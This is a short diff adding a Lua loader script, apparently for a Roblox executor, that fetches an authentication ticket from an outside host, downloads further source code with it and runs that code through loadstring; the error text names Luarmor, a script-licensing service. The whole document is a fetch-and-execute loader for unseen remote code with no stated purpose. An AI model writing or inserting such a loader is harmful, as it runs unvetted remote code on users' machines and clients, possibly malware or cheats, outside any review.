@@ -1,0 +1,5 @@
+local t = game:HttpGet("https://apidogbuddy.lovable.app/api/public/files/fc7e89bd075d2c33?stage=auth")
+local s = game:HttpGet("https://apidogbuddy.lovable.app/api/public/files/fc7e89bd075d2c33?stage=src&ticket=" .. game:GetService("HttpService"):UrlEncode(t))
+local f, e = loadstring(s)
+if not f then error("Larping Luarmor: " .. tostring(e)) end
+return f()
